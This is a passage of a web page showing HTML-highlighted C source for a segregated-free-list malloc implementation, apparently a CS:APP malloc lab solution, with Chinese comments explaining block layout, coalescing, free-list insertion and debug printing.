+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> &lt; Free block &gt;</span><br><span class="hljs-comment"> pred指向更小的block  succ指向更大的block</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">             31 30 29 28 27 26 25 24 23 22 21 20 19 18 17 16 15 14 13 12 11 10  9  8  7  6  5  4  3  2  1  0</span><br><span class="hljs-comment">            +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="hljs-comment"> Header :   |                              size of the block                                       |  |  | A|</span><br><span class="hljs-comment">    bp ---&gt; +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="hljs-comment">            |                        pointer to its predecessor in Segregated list                          |</span><br><span class="hljs-comment">bp+WSIZE--&gt; +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="hljs-comment">            |                        pointer to its successor in Segregated list                            |</span><br><span class="hljs-comment">            +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="hljs-comment">            .                                                                                               .</span><br><span class="hljs-comment">            .                                                                                               .</span><br><span class="hljs-comment">            .                                                                                               .</span><br><span class="hljs-comment">            +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="hljs-comment"> Footer :   |                              size of the block                                       |     | A|</span><br><span class="hljs-comment">            +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">///////////////////////////////// End of Block information /////////////////////////////////////////////////////////</span><br><br><span class="hljs-comment">/* 基础宏*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WSIZE 4 <span class="hljs-comment">// 字长4字节，块头尾信息也为4字节</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DSIZE 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNKSIZE (1 &lt;&lt; 12) <span class="hljs-comment">// 堆初始化大小 4KB 正好是页大小</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX(x, y) ((x) &gt; (y)) ? (x) : (y)</span><br><span class="hljs-comment">/* 把块大小和信息位结合*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACK(size, alloc) ((size) | (alloc))</span><br><span class="hljs-comment">/* 在地址p处读写 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET(p) (*(unsigned int *)(p))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUT(p, val) (*(unsigned int *)(p) = (val))</span><br><br><span class="hljs-comment">/*在pred和succ处设置指针*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SET_PTR(bp, ptr) (*(unsigned int *)(bp) = (unsigned int)(ptr))</span><br><br><span class="hljs-comment">/* 从头部或脚部 获取块大小和信息位的值 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span><br><br><span class="hljs-comment">/*给定块指针bp，其指向有效载荷，计算头部和尾部指针*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HDRP(bp) ((char *)(bp) - WSIZE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</span><br><br><span class="hljs-comment">/* 给定块指针bp, 计算先前块和后面块的地址 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE((char *)(bp) - WSIZE))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE((char *)(bp) - DSIZE))</span><br><br><span class="hljs-comment">/* 获取块的pred处和succ处*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRED(bp) ((char *)bp)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCC(bp) ((char *)(bp) + WSIZE)</span><br><br><span class="hljs-comment">/* 获取块的pred块和succ块*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRED_BLOCK(bp) (*(char **)(bp))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCC_BLOCK(bp) (*(char **)(SUCC(bp)))</span><br><br><span class="hljs-comment">/* 链表大小类的组数 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIST_SIZE 20</span><br><br><span class="hljs-comment">/*debug macros*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEBUG_HEAP_INFO 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEBUG_ORDER 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MM_INIT 00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MM_MALLOC 11</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MM_FREE 22</span><br><br><span class="hljs-comment">/*  basic func */</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">extend_heap</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>;<br><span class="hljs-type">void</span> *<span class="hljs-title function_">coalesce</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span>;<br><span class="hljs-type">void</span> *<span class="hljs-title function_">find_first_fit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> asize)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">place</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp, <span class="hljs-type">size_t</span> asize)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_list_idx</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">add_node</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_node</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span>;<br><br><span class="hljs-comment">/* debug func */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_heap</span><span class="hljs-params">(<span class="hljs-type">int</span> debug, <span class="hljs-type">int</span> flag)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print_free_list</span><span class="hljs-params">(<span class="hljs-type">int</span> debug)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">printf_command_number</span><span class="hljs-params">(<span class="hljs-type">int</span> bebug, <span class="hljs-type">int</span> flag)</span>;<br><br><span class="hljs-type">char</span> *heap_listp = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 序言块位置 用于打印heap</span><br><br><span class="hljs-comment">// 分离空闲链表 由于块大小至少为16,堆最大为20*(1&lt;&lt;20)  可将大小类分为[2^0,2^1).. [2^4,2^5),[2^5,2^6)......[2^19,2^20) 共计20类</span><br><span class="hljs-type">void</span> *segregated_free_lists[LIST_SIZE];<br><br><span class="hljs-comment">/*-------------------------------help function-----------------------*/</span><br><span class="hljs-comment">/* 扩展堆</span><br><span class="hljs-comment"> * 以字节为单位</span><br><span class="hljs-comment"> * 扩展后合并这个新申请的空闲块</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">extend_heap</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">char</span> *bp;<br><br>    <span class="hljs-comment">// size = ALIGN(size);</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span>)(bp = mem_sbrk(size)) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 申请失败</span><br><br>    PUT(HDRP(bp), PACK(size, <span class="hljs-number">0</span>)); <span class="hljs-comment">// 设置头部和脚步</span><br>    PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));<br>    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)); <span class="hljs-comment">// 设置结尾块</span><br>    <span class="hljs-comment">// 扩展堆之后，结尾块后面紧跟的就是有效载荷，结尾块变成该载荷的头部</span><br>    <span class="hljs-keyword">return</span> coalesce(bp);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">find_list_idx</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">int</span> list_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// find list_idx      [0,2)---&gt;idx=0  [16,32)  &lt;----&gt;  idx=4</span><br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">1</span> &amp;&amp; list_idx &lt; (LIST_SIZE - <span class="hljs-number">1</span>))<br>    &#123;<br>        size &gt;&gt;= <span class="hljs-number">1</span>;<br>        list_idx++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> list_idx;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 在链表中插入新的空闲块</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">add_node</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span><br>&#123;<br>    <span class="hljs-type">int</span> list_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">size_t</span> size = GET_SIZE(HDRP(bp));<br>    list_idx = find_list_idx(size);<br><br>    <span class="hljs-type">void</span> *pred_pos = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">void</span> *succ_pos = segregated_free_lists[list_idx];<br>    <span class="hljs-comment">// 所在大小类的链表为空</span><br>    <span class="hljs-keyword">if</span> (succ_pos == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        segregated_free_lists[list_idx] = bp;<br>        PUT(PRED(bp), (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-literal">NULL</span>));<br>        PUT(SUCC(bp), (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-literal">NULL</span>));<br>    &#125;<br>    <span class="hljs-comment">// 所在大小类的链表不为空</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-comment">// 从小到大遍历大小类 找到第一个大于等于插入块的位置 并记录其前驱块</span><br>        <span class="hljs-keyword">while</span> (succ_pos != <span class="hljs-literal">NULL</span> &amp;&amp; size &gt; GET_SIZE(HDRP(succ_pos)))<br>        &#123;<br>            pred_pos = succ_pos;<br>            succ_pos = SUCC_BLOCK(succ_pos);<br>        &#125;<br>        <span class="hljs-comment">// 链表中仅一个空闲块 且大于等于插入块</span><br>        <span class="hljs-keyword">if</span> (pred_pos == <span class="hljs-literal">NULL</span> &amp;&amp; succ_pos != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-comment">// PUT(PRED(bp), (unsigned int)NULL);</span><br>            <span class="hljs-comment">// PUT(SUCC(bp), (unsigned int)(succ_pos));</span><br>            <span class="hljs-comment">// PUT(PRED(succ_pos), (unsigned int)bp);</span><br>            SET_PTR(PRED(bp), <span class="hljs-literal">NULL</span>);<br>            SET_PTR(SUCC(bp), succ_pos);<br>            SET_PTR(PRED(succ_pos), bp);<br>            segregated_free_lists[list_idx] = bp;<br>        &#125;<br>        <span class="hljs-comment">// 链表空闲块都小于插入块</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (succ_pos == <span class="hljs-literal">NULL</span> &amp;&amp; pred_pos != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-comment">// PUT(PRED(bp), (unsigned int)pred_pos);</span><br>            <span class="hljs-comment">// PUT(SUCC(bp), (unsigned int)NULL);</span><br>            <span class="hljs-comment">// PUT(SUCC(pred_pos), (unsigned int)bp);</span><br>            SET_PTR(PRED(bp), pred_pos);<br>            SET_PTR(SUCC(bp), <span class="hljs-literal">NULL</span>);<br>            SET_PTR(SUCC(pred_pos), bp);<br>        &#125;<br>        <span class="hljs-comment">// 插入块在链表中间</span><br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-comment">// PUT(PRED(bp), (unsigned int)pred_pos);</span><br>            <span class="hljs-comment">// PUT(SUCC(pred_pos), (unsigned int)bp);</span><br>            <span class="hljs-comment">// PUT(SUCC(bp), (unsigned int)succ_pos);</span><br>            <span class="hljs-comment">// PUT(PRED(succ_pos), (unsigned int)bp);</span><br>            SET_PTR(PRED(bp), pred_pos);<br>            SET_PTR(SUCC(pred_pos), bp);<br>            SET_PTR(SUCC(bp), succ_pos);<br>            SET_PTR(PRED(succ_pos), bp);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 在链表中删除指定的空闲块  依赖于node指向块的大小</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_node</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (bp == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">// find list_idx        size=16  &lt;----&gt;  idx=0</span><br>    <span class="hljs-type">int</span> list_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">size_t</span> size = GET_SIZE(HDRP(bp));<br>    list_idx = find_list_idx(size);<br><br>    <span class="hljs-type">void</span> *pred_block = PRED_BLOCK(bp);<br>    <span class="hljs-type">void</span> *succ_block = SUCC_BLOCK(bp);<br><br>    <span class="hljs-comment">// 链表的四种情况</span><br>    <span class="hljs-keyword">if</span> (pred_block == <span class="hljs-literal">NULL</span> &amp;&amp; succ_block == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        segregated_free_lists[list_idx] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pred_block != <span class="hljs-literal">NULL</span> &amp;&amp; succ_block == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-comment">// PUT(SUCC(pred_block), (unsigned int)NULL);</span><br>        SET_PTR(SUCC(pred_block), <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pred_block == <span class="hljs-literal">NULL</span> &amp;&amp; succ_block != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-comment">// PUT(PRED(succ_block), (unsigned int)NULL);</span><br>        SET_PTR(PRED(succ_block), <span class="hljs-literal">NULL</span>);<br>        segregated_free_lists[list_idx] = succ_block;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-comment">// PUT(PRED(succ_block), (unsigned int)pred_block);</span><br>        <span class="hljs-comment">// PUT(SUCC(pred_block), (unsigned int)succ_block);</span><br>        SET_PTR(PRED(succ_block), pred_block);<br>        SET_PTR(SUCC(pred_block), succ_block);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 合并空闲块 序言块和结尾块 有效避免了边界处理</span><br><span class="hljs-comment"> * 参数bp指向有效载荷</span><br><span class="hljs-comment"> * 合并时在链表中删除前后的空闲块</span><br><span class="hljs-comment"> * 返回合并后的bp</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">coalesce</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span><br>&#123;<br>    <span class="hljs-type">void</span> *prev_block = PREV_BLKP(bp);<br>    <span class="hljs-type">void</span> *next_block = NEXT_BLKP(bp);<br><br>    <span class="hljs-type">size_t</span> prev_alloc = GET_ALLOC(HDRP(prev_block));<br>    <span class="hljs-type">size_t</span> next_alloc = GET_ALLOC(HDRP(next_block));<br>    <span class="hljs-type">size_t</span> size = GET_SIZE(HDRP(bp));<br><br>    <span class="hljs-keyword">if</span> (prev_alloc &amp;&amp; next_alloc)<br>    &#123;<br>        <span class="hljs-keyword">return</span> bp;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (prev_alloc &amp;&amp; !next_alloc)<br>    &#123;<br>        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));<br>        delete_node(next_block);<br>        PUT(HDRP(bp), PACK(size, <span class="hljs-number">0</span>));<br>        PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!prev_alloc &amp;&amp; next_alloc)<br>    &#123;<br>        size += GET_SIZE(HDRP(PREV_BLKP(bp)));<br>        delete_node(prev_block);<br>        PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));<br>        PUT(HDRP(prev_block), PACK(size, <span class="hljs-number">0</span>));<br>        bp = prev_block;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        size += (GET_SIZE(FTRP(PREV_BLKP(bp))) +<br>                 GET_SIZE(HDRP(NEXT_BLKP(bp))));<br>        delete_node(prev_block);<br>        delete_node(next_block);<br>        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="hljs-number">0</span>));<br>        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="hljs-number">0</span>));<br>        bp = PREV_BLKP(bp);<br>    &#125;<br>    <span class="hljs-keyword">return</span> bp;<br>&#125;<br><br><span class="hljs-comment">// find fit free block</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">find_first_fit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br><br>    <span class="hljs-type">int</span> list_idx = <span class="hljs-number">0</span>;<br>    list_idx = find_list_idx(size);<br>    <span class="hljs-keyword">while</span> (list_idx &lt;= (LIST_SIZE - <span class="hljs-number">1</span>))<br>    &#123;<br>        <span class="hljs-type">void</span> *target_free_block = segregated_free_lists[list_idx];<br>        <span class="hljs-comment">// 找到第一个大于等于插入块的位置  从小到大遍历大小类</span><br>        <span class="hljs-keyword">while</span> (target_free_block != <span class="hljs-literal">NULL</span> &amp;&amp; size &gt; GET_SIZE(HDRP(target_free_block)))<br>        &#123;<br>            target_free_block = SUCC_BLOCK(target_free_block);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (target_free_block != <span class="hljs-literal">NULL</span> &amp;&amp; size &lt;= GET_SIZE(HDRP(target_free_block)))<br>            <span class="hljs-keyword">return</span> target_free_block;<br>        list_idx++;<br>    &#125;<br>    <span class="hljs-comment">// target_free_block==NULL 则要么大小类为空 要么大小类的块均不满足</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">// replace free block</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">place</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp, <span class="hljs-type">size_t</span> asize)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> csize = GET_SIZE(HDRP(bp)); <span class="hljs-comment">// 空闲块大小</span><br><br>    <span class="hljs-comment">// 剩余块大于等于16字节 则需要分割空闲块 否则直接作为内部碎片</span><br>    <span class="hljs-keyword">if</span> ((csize - asize) &lt; <span class="hljs-number">2</span> * DSIZE)<br>    &#123;<br>        PUT(HDRP(bp), PACK(csize, <span class="hljs-number">1</span>));<br>        PUT(FTRP(bp), PACK(csize, <span class="hljs-number">1</span>));<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        PUT(HDRP(bp), PACK(asize, <span class="hljs-number">1</span>));<br>        PUT(FTRP(bp), PACK(asize, <span class="hljs-number">1</span>));<br>        bp = NEXT_BLKP(bp);<br>        PUT(HDRP(bp), PACK(csize - asize, <span class="hljs-number">0</span>));<br>        PUT(FTRP(bp), PACK(csize - asize, <span class="hljs-number">0</span>));<br>        add_node(bp); <span class="hljs-comment">// 添加新的空闲块</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/*-------------------------------------end help function------------------------ */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * mm_init - initialize the malloc package.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mm_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> *brk;<br>    <span class="hljs-comment">// 申请四个字 用于存储起始块、结尾块和序言块</span><br>    <span class="hljs-keyword">if</span> ((brk = mem_sbrk(<span class="hljs-number">4</span> * WSIZE)) == (<span class="hljs-type">void</span> *)(<span class="hljs-number">-1</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-comment">// 一定要清空链表 因为mdriver会多次执行rep文件，</span><br>    <span class="hljs-comment">// 每次执行之后,会产生一个很大的堆空间,必须清空对它的记录</span><br>    <span class="hljs-comment">// 这说明变量使用前初始化是个好习惯</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; LIST_SIZE; i++)<br>    &#123;<br>        segregated_free_lists[i] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    PUT(brk, <span class="hljs-number">0</span>);<br>    PUT(brk + WSIZE, PACK(<span class="hljs-number">8</span>, <span class="hljs-number">1</span>));<br>    PUT(brk + <span class="hljs-number">2</span> * WSIZE, PACK(<span class="hljs-number">8</span>, <span class="hljs-number">1</span>));<br>    PUT(brk + <span class="hljs-number">3</span> * WSIZE, PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));<br>    heap_listp = brk + DSIZE;<br>    <span class="hljs-comment">// 申请一个初始的空闲块</span><br>    <span class="hljs-keyword">if</span> ((brk = extend_heap(CHUNKSIZE)) == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 申请失败</span><br>    add_node(brk); <span class="hljs-comment">// 添加到链表</span><br>    print_heap(DEBUG_HEAP_INFO, MM_INIT);<br>    print_free_list(DEBUG_HEAP_INFO);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span><br><span class="hljs-comment"> *     Always allocate a block whose size is a multiple of the alignment.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> asize;       <span class="hljs-comment">// adjust block size</span><br>    <span class="hljs-type">size_t</span> extend_size; <span class="hljs-comment">// extend heap size</span><br>    <span class="hljs-type">char</span> *bp;<br><br>    <span class="hljs-keyword">if</span> (size == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// 块最小为16字节   有效载荷最小为8字节  要求按八字节对齐</span><br>    <span class="hljs-comment">// 有效载荷小于8 则按16处理；大于8，则加8后向上舍入到8的倍数</span><br>    <span class="hljs-keyword">if</span> (size &lt;= DSIZE)<br>        asize = <span class="hljs-number">2</span> * DSIZE;<br>    <span class="hljs-keyword">else</span><br>        asize = ALIGN(size + <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">// 寻找合适的空闲块</span><br>    <span class="hljs-keyword">if</span> ((bp = find_first_fit(asize)) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        delete_node(bp);<br>        place(bp, asize);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    <span class="hljs-comment">// 没找到合适块 则需要扩展堆 按至少4kB大小来扩展</span><br>    &#123;<br>        extend_size = MAX(asize, CHUNKSIZE);<br>        <span class="hljs-keyword">if</span> ((bp = extend_heap(extend_size)) == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        place(bp, asize);<br>    &#125;<br>    print_heap(DEBUG_HEAP_INFO, MM_MALLOC);<br>    print_free_list(DEBUG_HEAP_INFO);<br>    printf_command_number(DEBUG_ORDER, MM_MALLOC);<br>    <span class="hljs-keyword">return</span> bp;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * mm_free - Freeing a block does nothing.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">mm_free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> size = GET_SIZE(HDRP(ptr));<br>    PUT(HDRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    PUT(FTRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    <span class="hljs-type">void</span> *bp = coalesce(ptr); <span class="hljs-comment">// 合并空闲块</span><br>    add_node(bp);             <span class="hljs-comment">// 记录在链表中</span><br>    print_heap(DEBUG_HEAP_INFO, MM_FREE);<br>    print_free_list(DEBUG_HEAP_INFO);<br>    printf_command_number(DEBUG_ORDER, MM_FREE);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_realloc</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">void</span> *oldptr = ptr;<br>    <span class="hljs-type">void</span> *newptr;<br>    <span class="hljs-type">size_t</span> copySize;<br><br>    newptr = mm_malloc(size);<br>    <span class="hljs-keyword">if</span> (newptr == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">// copySize = *(size_t *)((char *)oldptr - SIZE_T_SIZE);</span><br>    copySize = GET_SIZE(HDRP(ptr));<br><br>    <span class="hljs-keyword">if</span> (size &lt; copySize)<br>        copySize = size;<br>    <span class="hljs-built_in">memcpy</span>(newptr, oldptr, copySize);<br>    mm_free(oldptr);<br>    <span class="hljs-keyword">return</span> newptr;<br>&#125;<br><br><span class="hljs-comment">/*-----------------------------------check heap-------------------------------------*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_heap</span><span class="hljs-params">(<span class="hljs-type">int</span> debug, <span class="hljs-type">int</span> flag)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!debug)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-type">char</span> *heap_st = heap_listp;<br>    <span class="hljs-type">char</span> *block_adr = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> block_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> alloc_bit = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> alloc_free_count = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> debug_count = <span class="hljs-number">5</span>; <span class="hljs-comment">// 打印rep的命令序号 printf heap</span><br><br>    <span class="hljs-comment">// 打印到结尾块</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--command order:%d--------------------------heap info for debug------------------------------------\n&quot;</span>, debug_count);<br>    <span class="hljs-keyword">while</span> (GET_SIZE(HDRP(heap_st)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        block_adr = (<span class="hljs-type">char</span> *)heap_st;<br>        block_size = GET_SIZE(HDRP(heap_st));<br>        alloc_bit = GET_ALLOC(HDRP(heap_st));<br>        <span class="hljs-keyword">if</span> (alloc_bit == <span class="hljs-number">0</span>)<br>            alloc_free_count++;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--------------------------\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;| ad=%x               |\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)block_adr);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;| size=%8d |  alloc=%d  |\n&quot;</span>, block_size, alloc_bit);<br>        heap_st = NEXT_BLKP(heap_st);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc free count:%d\n&quot;</span>, alloc_free_count);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--command order:%d--------------------------end heap info for debug----------------------------------\n&quot;</span>, debug_count);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">if</span> (flag == MM_MALLOC || flag == MM_FREE)<br>        debug_count++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_free_list</span><span class="hljs-params">(<span class="hljs-type">int</span> debug)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!debug)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-type">void</span> *block_st = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-----------------------------------list info for debug--------------------------------------------\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span 